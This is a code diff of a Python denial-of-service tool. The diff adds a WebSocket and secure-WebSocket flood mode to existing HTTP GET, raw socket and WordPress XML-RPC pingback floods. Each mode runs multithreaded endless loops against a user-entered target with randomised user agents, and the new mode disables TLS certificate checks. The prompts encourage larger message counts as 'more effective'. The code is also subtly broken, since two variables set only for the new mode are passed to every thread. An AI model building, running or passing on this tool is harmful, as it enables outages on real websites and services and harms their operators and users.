@@ -14,6 +14,9 @@ import threading
 import socket
 import os
 from colorama import Fore, Style
+import asyncio
+import websockets
+import ssl
 
 
 def chub_ascii():
@@ -62,59 +65,131 @@ def print_down(thread_id):
     )
 
 
+def sending_socket(thread_id):
+    print(
+        Fore.BLUE
+        + f"\rThread {thread_id}: Sending message to server..        "
+        + Style.RESET_ALL,
+        end="",
+    )
+
+
 def chub_user_agent():
     user_agent = fake_useragent.UserAgent()
     return user_agent.random
 
 
-def chub_request(host, headers, thread_id, target_port):
+async def chubWebSocketAttack(host, msg, msg_num, thread_id):
+    while True:
+        try:
+            async with websockets.connect(host) as websocket:
+                while True:
+                    try:
+                        await websocket.send(msg * msg_num)  # keep connection alive
+                        sending_socket(thread_id)
+                    except websockets.ConnectionClosed:
+                        print_up(thread_id)
+                    except Exception as e:
+                        print_down(thread_id)
+
+                    await asyncio.sleep(1)
+        except Exception as e:
+            print_down(thread_id)
+
+
+async def chubSecureWebSocketAttack(host, msg, msg_num, thread_id):
+    ssl_context = ssl.create_default_context()
+    ssl_context.check_hostname = False
+    ssl_context.verify_mode = ssl.CERT_NONE
+    while True:
+        try:
+            async with websockets.connect(host, ssl=ssl_context) as websocket:
+                while True:
+                    try:
+                        await websocket.send(msg * msg_num)  # keep connection alive
+                        sending_socket(thread_id)
+                    except websockets.ConnectionClosed:
+                        print_up(thread_id)
+                    except Exception as e:
+                        print_down(thread_id)
+                    await asyncio.sleep(1)
+        except Exception as e:
+            print_down(thread_id)
+
+
+def chub_request(host, headers, thread_id, target_port, word, word_num):
     global user_option, num_timeout
 
     if user_option == 0:  # Using normal get request
-        try:
-            requests.get(host, headers=headers, timeout=num_timeout)
-            print_up(thread_id)
-        except requests.RequestException as e:
-            print_down(thread_id)
+        while True:
+            try:
+                requests.get(host, headers=headers, timeout=num_timeout)
+                print_up(thread_id)
+            except requests.RequestException as e:
+                print_down(thread_id)
     if user_option == 1:  # using socket
-        try:
-            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            client_socket.connect((host, target_port))
-            client_socket.sendall(f"GET / HTTP/1.1\r\nHost: {host}\r\n".encode())
-            print_up(thread_id)
-            time.sleep(num_timeout)
-        except Exception as e:
-            print_down(thread_id)
+        while True:
+            try:
+                client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                client_socket.connect((host, target_port))
+                client_socket.sendall(f"GET / HTTP/1.1\r\nHost: {host}\r\n".encode())
+                print_up(thread_id)
+                time.sleep(num_timeout)
+            except Exception as e:
+                print_down(thread_id)
     if user_option == 2:  # XMLRPC DoS
-        try:
-            payload = f"""<?xml version="1.0"?>
-                            <methodCall>
-                            <methodName>pingback.ping</methodName>
-                            <params>
-                                <param><value><string>{host}</string></value></param>
-                                <param><value><string>https://target-site.com/</string></value></param>
-                            </params>
-                            </methodCall>"""
-            requests.post(host, data=payload, headers={"Content-Type": "text/xml"}, timeout=num_timeout)
-            print_up(thread_id)
-        except Exception as e:
-            print_down(thread_id)
+        while True:
+            try:
+                payload = f"""<?xml version="1.0"?>
+                                <methodCall>
+                                <methodName>pingback.ping</methodName>
+                                <params>
+                                    <param><value><string>{host}</string></value></param>
+                                    <param><value><string>https://target-site.com/</string></value></param>
+                                </params>
+                                </methodCall>"""
+                requests.post(
+                    host,
+                    data=payload,
+                    headers={"Content-Type": "text/xml"},
+                    timeout=num_timeout,
+                )
+                print_up(thread_id)
+            except Exception as e:
+                print_down(thread_id)
+    if user_option == 3:
+        if "ws://" in host:
+            try:
+                # Run the asyncio event loop
+                asyncio.run(chubWebSocketAttack(host, word, word_num, thread_id))
+            except Exception as e:
+                print(f"An error occurred: {e}")
+        elif "wss://" in host:
+            try:
+                # Run the asyncio event loop
+                asyncio.run(chubSecureWebSocketAttack(host, word, word_num, thread_id))
+            except Exception as e:
+                print(f"An error occurred: {e}")
 
 
-def chub_thread(thread_id, target_host, target_port):
+def chub_thread(thread_id, target_host, target_port, msg, msg_num):
     random_user_agent = chub_user_agent()
     custom_headers = {
         "User-Agent": random_user_agent,
     }
-    while True:
-        chub_request(target_host, custom_headers, thread_id, target_port)
+    chub_request(target_host, custom_headers, thread_id, target_port, msg, msg_num)
 
 
 if __name__ == "__main__":
     try:
         os.system("cls")
         chub_ascii()
-        options = ["Using direct URL (http://example.com)", "Using DNS or IP (example.com or 127.0.0.1)", "Wordpress XMLRPC DoS"]
+        options = [
+            "Using direct URL (http://example.com)",
+            "Using DNS or IP (example.com or 127.0.0.1)",
+            "Wordpress XMLRPC Flood",
+            "WebSocket/SecureWebSucket Flood",
+        ]
         for i in range(len(options)):
             print(f"{i}. {options[i]}")
         user_option = -1
@@ -125,6 +200,8 @@ if __name__ == "__main__":
         chub_ascii()
 
         target_port = 0  # just initialize
+        word = ""
+        word_num = 0
 
         if user_option == 0:
             target_host = input("Enter target URL (http://example.com): ")
@@ -135,6 +212,17 @@ if __name__ == "__main__":
 
         if user_option == 2:
             target_host = input("Enter XMLRPC URL (http://example.com/xmlrpc.php): ")
+
+        if user_option == 3:
+            target_host = input(
+                "Enter WS/WSS Connection (ws://example.com:8080 or wss://example.com:8080): "
+            )
+            message = input(
+                "Enter message to server (Hello Server ! or what ever you like): "
+            )
+            message_num = int(
+                input("Enter message number (more larger more effective): ")
+            )
 
         num_timeout = int(
             input("Enter the number of " + Fore.BLUE + "timeout: " + Style.RESET_ALL)
@@ -147,7 +235,8 @@ if __name__ == "__main__":
         threads = []
         for i in range(num_threads):
             thread = threading.Thread(
-                target=chub_thread, args=(i, target_host, target_port)
+                target=chub_thread,
+                args=(i, target_host, target_port, message, message_num),
             )
             threads.append(thread)
 
